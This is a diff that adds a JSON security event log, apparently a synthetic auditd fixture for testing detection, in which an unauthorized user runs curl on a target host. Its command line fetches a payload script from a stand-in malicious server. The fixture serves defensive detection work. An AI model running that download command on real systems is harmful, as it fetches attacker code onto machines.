@@ -1,0 +1,32 @@
+{
+  "event": {
+    "category": "process",
+    "action": "start",
+    "module": "auditd",
+    "kind": "event"
+  },
+  "process": {
+    "name": "curl",
+    "pid": 45678,
+    "executable": "/usr/bin/curl",
+    "command_line": "curl -O http://malicious-server.com/payload.sh"
+  },
+  "host": {
+    "name": "target-host"
+  },
+  "user": {
+    "name": "unauthorized-user",
+    "id": "1003"
+  },
+  "source": {
+    "ip": "192.168.4.101",
+    "port": 12345
+  },
+  "destination": {
+    "ip": "203.0.113.50",
+    "port": 80
+  },
+  "@timestamp": "2025-03-26T13:15:30.456Z",
+  "message": "Process start detected: curl downloading file from http://malicious-server.com/payload.sh"
+}
+
